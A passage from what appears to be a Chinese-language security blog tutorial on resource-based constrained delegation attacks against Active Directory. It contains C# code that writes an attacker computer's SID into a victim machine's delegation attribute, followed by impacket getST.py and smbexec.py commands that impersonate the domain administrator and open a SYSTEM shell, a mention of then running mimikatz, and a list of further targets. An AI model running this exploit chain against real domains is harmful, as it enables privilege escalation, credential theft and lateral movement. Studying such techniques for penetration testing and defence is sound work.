myldapConnection.AuthenticationType = System.DirectoryServices.AuthenticationTypes.Secure;</span><br><span class="line">            System.DirectoryServices.DirectorySearcher search = <span class="keyword">new</span> System.DirectoryServices.DirectorySearcher(myldapConnection);</span><br><span class="line">            <span class="comment">//通过ldap找计算机</span></span><br><span class="line">            search.Filter = <span class="string">"(CN="</span> + victimcomputer + <span class="string">")"</span>;</span><br><span class="line">            <span class="built_in">string</span>[] requiredProperties = <span class="keyword">new</span> <span class="built_in">string</span>[] &#123; <span class="string">"samaccountname"</span> &#125;;</span><br><span class="line">            foreach (String property in requiredProperties)</span><br><span class="line">                search.PropertiesToLoad.Add(property);</span><br><span class="line">            System.DirectoryServices.SearchResult result = null;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                result = search.FindOne();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (System.Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(ex.Message + <span class="string">"Exiting..."</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (result != null)</span><br><span class="line">            &#123;</span><br><span class="line">                System.DirectoryServices.DirectoryEntry entryToUpdate = result.GetDirectoryEntry();</span><br><span class="line">                String sec_descriptor = <span class="string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;"</span> + sid.Value + <span class="string">")"</span>;</span><br><span class="line">                System.Security.AccessControl.RawSecurityDescriptor sd = <span class="keyword">new</span> RawSecurityDescriptor(sec_descriptor);</span><br><span class="line">                byte[] descriptor_buffer = <span class="keyword">new</span> byte[sd.BinaryLength];</span><br><span class="line">                sd.GetBinaryForm(descriptor_buffer, <span class="number">0</span>);</span><br><span class="line">                <span class="comment">// 添加evilpc的sid到msds-allowedtoactonbehalfofotheridentity中</span></span><br><span class="line">                entryToUpdate.Properties[<span class="string">"msds-allowedtoactonbehalfofotheridentity"</span>].Value = descriptor_buffer;</span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    entryToUpdate.CommitChanges();<span class="comment">//提交更改</span></span><br><span class="line">                    Console.WriteLine(<span class="string">"[+] Exploit successfully!"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (System.Exception ex)</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(ex.Message);</span><br><span class="line">                    Console.WriteLine(<span class="string">"[!] \nFailed..."</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1628755147703-46cc40ba-e57b-46a7-b82c-0209be70f0d1.png" alt="img"></p>
<p>impacket 套件中的 getST.py 申请票据，导入票据执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py -dc-ip 192.168.247.8 test.local/testpc1\$:123456 -spn cifs/WIN10.test.local -impersonate administrator</span><br><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line">python3 smbexec.py -no-pass -k WIN10.test.local</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1628755155329-e39b31e0-0fa4-49d8-bdc6-c7893cfef3cd.png" alt="img"></p>
<p>system权限上线就可以愉快的执行mimikatz了。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1628755160196-89670c40-0fba-4ed7-a1d5-e5900b32c6d1.png" alt="img"></p>
<h3><span id="0x03-其他攻击场景">0x03 其他攻击场景</span></h3><ul>
<li>一个公司可能会有一个专门用来加域的账号，虽然这个账户通常只有普通域用户权限，但是如果我们控制了这个账户那么就可以打下一大批机器。 </li>
<li>如果我们想拿域内机器A的权限，如果我们又没有机器A administrators 组成员凭据的话还可以看机器A是通过哪个用户加入域的，控制了这个用户依然可以获取权限。 </li>
<li>一个域用户X 可能会在域中创建多台机器(比如笔记本和台式机都需要加入域)，当我们有了域用户X的权限时，可以利用rbcd继续攻击其他mS-DS-CreatorSID是域用户X的机器。 </li>
</ul>
<h3><span id="0x04-参考链接">0x04 参考链接</span></h3><p><a href="https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw</a></p>
<p><a href="https://mp.weixin.qq.com/s/rXqSfjTFUQJsirkhi1hmHQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/rXqSfjTFUQJsirkhi1hmHQ</a></p>
<p><a href="https://daiker.gitbook.io/" target="_blank" rel="noopener">https://daiker.gitbook.io/</a></p>
<p><a href="https://www.cnblogs.com/car7n/p/14789004.html" target="_blank" rel="noopener">https://www.cnblogs.com/car7n/p/14789004.html</a></p>
<p><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" target="_blank" rel="noopener">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</a></p>
<p><a href="https://xz.aliyun.com/t/8690#toc-73" target="_blank" rel="noopener">https://xz.aliyun.com/t/8690#toc-73</a></p>
</div></article></div></section><footer><div class="paginator"><a href="/posts/notes/非约束委派 + Kerberos中继.html" class="prev">上一篇</a><a href="/posts/notes/FRP改造计划续.html" class="next">下一篇</a></div><div class="copyright"><p>© 2016 - 2024 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>